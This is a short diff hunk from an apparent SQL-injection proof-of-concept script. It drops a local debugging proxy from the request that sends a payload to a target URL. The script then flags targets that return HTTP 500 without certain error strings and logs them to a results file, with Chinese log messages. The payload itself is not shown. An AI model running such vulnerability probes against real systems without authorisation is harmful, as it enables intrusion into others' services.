@@ -65,7 +65,7 @@ def poc(target):
         'https': 'https://127.0.0.1:8080'
     }
     try:
-        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=5, proxies=proxies)
+        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=5)
         if res1.status_code == 500 and "参数异常" not in res1.text and "注入风险" not in res1.text:
             logger.info(f"[+] {target} 存在SQL注入漏洞")
             with open('mingfeiresult.txt', 'a', encoding='utf-8') as f:
